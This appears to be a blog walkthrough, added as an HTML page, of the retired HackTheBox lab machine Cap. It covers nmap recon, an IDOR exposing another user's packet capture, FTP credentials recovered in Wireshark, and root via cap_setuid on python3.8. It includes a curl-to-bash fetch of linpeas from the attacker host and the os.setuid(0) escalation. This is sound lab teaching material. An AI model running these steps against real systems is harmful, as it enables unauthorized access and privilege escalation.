@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Cap: IDOR capture theft and python capabilities to root — Lucky Thandel</title>
+<meta name="description" content="Official-format walkthrough: Gunicorn dashboard recon, /data/&lt;id&gt; IDOR capture theft, Wireshark credential recovery, and cap_setuid python to root — with screenshots. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-09-30 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Cap: IDOR capture theft and python capabilities to root</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Cap is an easy Linux machine running an HTTP dashboard that performs administrative functions including network captures. Weak object references expose another user’s capture, the capture holds plaintext credentials for foothold, and a Linux capability escalates to root. Format follows the official HTB walkthrough structure: synopsis, skills, enumeration, exploitation, privilege escalation.</p>
+<h2><span class="amber">$</span> Synopsis</h2>
+<p>Target services: FTP (21), SSH (22), and a Gunicorn-based HTTP dashboard on port 80. The dashboard executes system commands (ifconfig, netstat) and lets users take 5-second packet captures downloadable as PCAP files. Captures are addressed as /data/&lt;id&gt; with incrementing IDs — browsing /data/0 reveals another user’s capture containing FTP authentication in plaintext. Those credentials work over SSH, and the cap_setuid capability on python3.8 gives root via os.setuid(0).</p>
+<h2><span class="amber">$</span> Skills required</h2>
+<p>Web enumeration, packet capture analysis with Wireshark, Linux capability abuse.</p>
+<h2><span class="amber">$</span> Enumeration — Nmap</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: all ports, then targeted scan</span>
+ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -Pn -sC -sV 10.10.10.245</pre>
+<p>Nmap reveals three open ports: FTP (21, vsftpd 3.0.3), SSH (22, OpenSSH 8.2p1), and HTTP on port 80 (Gunicorn).</p>
+<figure class="post-figure"><img src="../../screenshots/cap/cap-nmap.png" alt="Nmap scan results against Cap showing FTP, SSH and HTTP" loading="lazy"><figcaption>Nmap results: FTP, SSH, and a Gunicorn HTTP server.</figcaption></figure>
+<h2><span class="amber">$</span> Enumeration — FTP</h2>
+<p>Check anonymous access first — it fails, so FTP is parked until credentials appear later.</p>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># ftp: test anonymous login</span>
+ftp 10.10.10.245
+Name (10.10.10.245:root): anonymous
+331 Please specify the password.
+Password:
+530 Login incorrect.
+ftp: Login failed.</pre>
+<figure class="post-figure"><img src="../../screenshots/cap/cap-ftp-fail.png" alt="FTP anonymous login rejected on Cap" loading="lazy"><figcaption>Anonymous FTP is disabled — moving on to HTTP.</figcaption></figure>
+<h2><span class="amber">$</span> Enumeration — HTTP dashboard</h2>
+<p>Browsing port 80 reveals a monitoring dashboard with Security Snapshot (5-second PCAP + analysis), IP Config, and Network Status pages. The IP Config page prints ifconfig output and Network Status prints netstat — the application is executing system commands. The Security Snapshot menu pauses a few seconds and returns a capture analysis page with a Download link for the PCAP.</p>
+<figure class="post-figure"><img src="../../screenshots/cap/cap-dashboard.png" alt="Cap monitoring dashboard with security events graphs" loading="lazy"><figcaption>The dashboard: security events, login attempts, and snapshot tools.</figcaption></figure>
+<figure class="post-figure"><img src="../../screenshots/cap/cap-ipconfig.png" alt="IP Config page showing ifconfig output" loading="lazy"><figcaption>IP Config leaks ifconfig output — the app runs system commands.</figcaption></figure>
+<h2><span class="amber">$</span> IDOR — another user’s capture</h2>
+<p>New captures are addressed as /data/&lt;id&gt; with the ID incrementing per capture. Trying lower IDs is the obvious test: browsing to /data/0 reveals a capture with far more packets than ours — data belonging to another user. This is Insecure Direct Object Reference: no ownership check on the capture ID.</p>
+<figure class="post-figure"><img src="../../screenshots/cap/cap-capture-stats.png" alt="Our own capture analysis showing 8 packets" loading="lazy"><figcaption>Our capture: only 8 packets of our own traffic.</figcaption></figure>
+<figure class="post-figure"><img src="../../screenshots/cap/cap-capture-id0.png" alt="Capture ID 0 analysis showing 72 packets from another user" loading="lazy"><figcaption>/data/0: 72 packets from somebody else — IDOR confirmed.</figcaption></figure>
+<h2><span class="amber">$</span> Foothold — Wireshark credential recovery</h2>
+<p>Download the ID 0 capture and open it in Wireshark. It contains FTP control traffic in plaintext, including USER nathan and the PASS value. The same credentials authenticate over SSH — foothold achieved.</p>
+<figure class="post-figure"><img src="../../screenshots/cap/cap-wireshark.png" alt="Wireshark showing FTP traffic inside the stolen capture" loading="lazy"><figcaption>The stolen capture in Wireshark: FTP control channel in cleartext.</figcaption></figure>
+<figure class="post-figure"><img src="../../screenshots/cap/cap-ftp-creds.png" alt="Wireshark packet detail showing FTP username and password" loading="lazy"><figcaption>USER nathan and its PASS in the clear — valid for SSH too.</figcaption></figure>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># ssh: login as nathan</span>
+ssh nathan@10.10.10.245
+nathan@cap:~$ id
+uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)</pre>
+<figure class="post-figure"><img src="../../screenshots/cap/cap-ssh.png" alt="SSH login as nathan with id output" loading="lazy"><figcaption>Foothold: SSH as nathan.</figcaption></figure>
+<h2><span class="amber">$</span> Privilege escalation — linpeas and capabilities</h2>
+<p>Run linpeas (serve it from the attack box with python3 -m http.server and pipe curl into bash) and look for files with capabilities. /usr/bin/python3.8 carries cap_setuid plus cap_net_bind_service — not a default. CAP_SETUID lets the process switch UID without the SUID bit, so python can become root directly.</p>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: run linpeas, inspect capabilities</span>
+curl http://10.10.14.24/linpeas.sh | bash
+&lt;SNIP&gt;
+Files with capabilities:
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep</pre>
+<figure class="post-figure"><img src="../../screenshots/cap/cap-linpeas.png" alt="LinPEAS output showing python3.8 with cap_setuid" loading="lazy"><figcaption>LinPEAS flags it: python3.8 with cap_setuid.</figcaption></figure>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># python: setuid to root</span>
+nathan@cap:/tmp$ /usr/bin/python3.8
+&gt;&gt;&gt; import os
+&gt;&gt;&gt; os.setuid(0)
+&gt;&gt;&gt; os.system(&quot;/bin/bash&quot;)
+root@cap:/tmp# id
+uid=0(root) gid=1001(nathan) groups=1001(nathan)</pre>
+<figure class="post-figure"><img src="../../screenshots/cap/cap-root.png" alt="Python setuid to UID 0 with root shell and id output" loading="lazy"><figcaption>os.setuid(0): root shell. Both flags fall from here.</figcaption></figure>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Enforce per-user ownership checks on every object ID (the /data/&lt;id&gt; endpoint must verify the requester owns the capture), never transmit credentials in plaintext protocols, and never grant cap_setuid to interpreters — a capable python is a root shell waiting for three lines of code. User and root flag values are redacted per HTB rules.</p>
+<p>Screenshots: official HTB walkthrough captures, used for illustration. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
